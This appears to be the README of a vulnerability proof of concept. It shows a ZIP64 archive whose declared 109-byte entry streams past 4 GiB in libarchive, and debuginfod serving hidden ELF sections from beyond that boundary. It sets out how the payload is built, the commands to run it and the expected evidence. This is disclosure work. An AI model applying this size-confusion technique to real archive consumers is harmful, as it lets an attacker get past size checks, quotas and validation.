# libarchive ZIP declared-size boundary bypass through debuginfod

This proof of concept demonstrates a stock libarchive ZIP reader returning a successful decompression stream that is larger than the size advertised through the archive entry metadata, then shows a real debuginfod service indexing and serving data that lives beyond that advertised boundary.

The generated archive has one stored ZIP64 member:

```text
entry name: poc-hidden-debug-file
advertised entry size: 109
actual inflated size: 4,294,967,405
actual inflated size modulo 2^32: 109
payload prefix: ELF executable with a GNU build-id note and PoC marker section beyond byte 109
```

The PoC uses only stock command-line integrations:

```text
bsdtar -tvf
bsdunzip -l
bsdunzip -t
bsdunzip -p
debuginfod
curl
```

The stock CLI marker demonstration invokes `bsdunzip -p`, streams the clean-success output, confirms that the hidden marker begins at byte `109`, and writes `VULNERABILITY_CONFIRMED.marker`.

The debuginfod demonstration keeps client-side output bounded. It proves that the archive lists as 109 bytes, passes stock libarchive ZIP testing, causes debuginfod to return sections whose file offsets are past byte 109, and leaves a marker file only after the hidden marker section is served by debuginfod.

## Impact

Applications commonly use `archive_entry_size()` as the trusted file-size boundary for validation, quotas, authorization, indexing, storage accounting, and IPC framing. This PoC supplies an archive where that metadata boundary is `109`, while the stock ZIP reader returns `4,294,967,405` bytes and completes successfully.

For debuginfod, the service scans an attacker-supplied archive path, extracts the entry through libarchive, classifies the extracted file as ELF content, indexes its build-id, and later serves debug sections derived from bytes beyond the advertised entry size.

The demonstrated boundary crossing is:

```text
ZIP metadata says 109 bytes
libarchive returns 4,294,967,405 bytes
debuginfod indexes an ELF build-id located beyond byte 109
debuginfod serves the hidden .note.gnu.build-id section by build-id URL
debuginfod serves the hidden .poc_marker section by build-id URL
the runner writes VULNERABILITY_CONFIRMED.marker from the served marker section
```

## Requirements

Run on Linux with:

```text
python3
gcc
binutils readelf
libarchive bsdtar
libarchive bsdunzip
elfutils debuginfod
curl
```

On Debian or Ubuntu systems, the package names are typically:

```bash
sudo apt-get install -y python3 gcc binutils libarchive-tools elfutils debuginfod curl
```

To test a locally built libarchive instead of the system library, pass the directory containing `libarchive.so`:

```bash
bash run_demo.sh --libarchive-dir /path/to/libarchive/build/libarchive
```

## Quick Run

The stock CLI marker run needs only Python and `bsdunzip`:

```bash
python3 run_stock_marker.py --work-dir /tmp/libarchive-stock-marker
```

Expected marker evidence:

```text
declared_size=109
actual_streamed_size=4294967405
bsdunzip_exit=0
marker_offset=109
marker_file=/tmp/libarchive-stock-marker/VULNERABILITY_CONFIRMED.marker
```

The marker file contains:

```text
confirmed=true
source=stock_bsdunzip_stdout
declared_size=109
actual_streamed_size=4294967405
marker_offset=109
marker=LIBARCHIVE_STOCK_CLI_BOUNDARY_MARKER_v1
```

## Debuginfod Run

From this directory:

```bash
bash run_demo.sh --work-dir /tmp/libarchive-zip-debuginfod-poc --port 18002
```

Expected evidence lines:

```text
build_id=<sha1>
declared_size=109
actual_inflated_size=4294967405
note_offset=<value greater than 109>
note_offset_past_declared=true
bsdunzip_test=testing: poc-hidden-debug-file     OK
section_size=36
build_id_present=true
marker_size=40
marker_present=true
section_http=HTTP/1.1 200 OK
section_Content-Length: 36
marker_section_http=HTTP/1.1 200 OK
marker_file=/tmp/libarchive-zip-debuginfod-poc/VULNERABILITY_CONFIRMED.marker
first_executable_Content-Length: 109
```

The first executable fetch is intentionally bounded by the advertised size. The section fetches are the compact proof: debuginfod returns sections from the hidden ELF after indexing and reading bytes past the advertised 109-byte boundary.

## Full Cache-Response Mode

The service cache can also be exercised with a full second executable response:

```bash
bash run_demo.sh --work-dir /tmp/libarchive-zip-debuginfod-poc --port 18002 --full-cache-response
```

This mode transfers `4,294,967,405` bytes over loopback to `/dev/null` and records the response headers in:

```text
/tmp/libarchive-zip-debuginfod-poc/logs/executable_second.headers
```

Expected full-response evidence:

```text
second_executable_http=HTTP/1.1 200 OK
second_executable_Content-Length: 4294967405
second_executable_X-DEBUGINFOD-SIZE: 4294967405
```

Use scratch storage for this mode because debuginfod keeps a file-descriptor cache for the extracted artifact while the process is running.

## Compact Deflate Mode

Systems with libarchive deflate support can generate a compact compressed archive:

```bash
bash run_demo.sh --work-dir /tmp/libarchive-zip-debuginfod-poc --port 18002 --compact-deflate
```

This keeps the same metadata boundary and marker-section evidence while reducing the archive body stored on disk.

## Generated Files

The runner writes all generated files under the selected work directory:

```text
src/poc.c
poc.elf
prefix.bin
archive-root/debuginfod_declared_109_actual_4g_plus_109.zip
stock_cli_declared_109_actual_4g_plus_109.zip
debuginfod.sqlite
logs/generator.log
logs/bsdtar_list.txt
logs/bsdunzip_list.txt
logs/bsdunzip_test.txt
logs/debuginfod.log
logs/section.headers
logs/section_check.txt
logs/marker_section.headers
logs/marker_check.txt
logs/executable_first.headers
section.bin
marker_section.bin
executable_first.bin
VULNERABILITY_CONFIRMED.marker
```

The repository folder contains only the source files needed to reproduce the PoC.

## Payload Construction

`make_debuginfod_zip.py` creates a stored sparse ZIP64 entry whose uncompressed-size fields are set to `109`. The actual stream is `4GiB + 109` bytes. The stream starts with a real ELF executable compiled by the runner and pads the rest with zero bytes. The CRC is computed over the full stream.

This layout makes the low 32 bits of the actual inflated length equal the advertised size:

```text
0x100000000 + 109 == 109 modulo 2^32
```

The generated ZIP therefore has a small advertised size, a sparse stored body, and a successful stock ZIP validation result. The optional compact deflate mode keeps the same values with a compressed body.

## Evidence Meaning

`bsdtar -tvf` and `bsdunzip -l` show the metadata boundary:

```text
109 poc-hidden-debug-file
```

`bsdunzip -t` shows stock libarchive accepts the generated archive:

```text
testing: poc-hidden-debug-file     OK
```

`readelf -S -W poc.elf` gives the file offset of `.note.gnu.build-id`. The runner prints `note_offset_past_declared=true` when that offset is greater than `109`.

The debuginfod section URLs prove that the service indexed and served bytes past the advertised boundary:

```text
http://127.0.0.1:<port>/buildid/<build-id>/section/.note.gnu.build-id
http://127.0.0.1:<port>/buildid/<build-id>/section/.poc_marker
```

`section_check.txt` verifies that the returned section contains the exact build-id from the compiled ELF:

```text
section_size=36
build_id_present=true
```

`marker_check.txt` verifies that the returned marker section contains the PoC marker:

```text
marker_size=40
marker_present=true
```

After that check passes, the runner writes:

```text
VULNERABILITY_CONFIRMED.marker
```

The marker file contains:

```text
confirmed=true
source=debuginfod_section_.poc_marker
build_id=<sha1>
marker=LIBARCHIVE_DEBuginfod_BOUNDARY_MARKER_v1
```

## File Layout

```text
README.md
make_debuginfod_zip.py
run_stock_marker.py
run_demo.sh
.gitignore
```

`make_debuginfod_zip.py` is the archive generator. `run_stock_marker.py` runs the stock CLI marker proof. `run_demo.sh` builds the ELF seed, generates the ZIP, runs stock libarchive tools, starts debuginfod, queries the build-id section, and prints the evidence summary.

## Cleanup

Stop the server with `Ctrl-C` if `--keep-server` was used. Remove the chosen work directory when finished:

```bash
rm -rf /tmp/libarchive-zip-debuginfod-poc
```
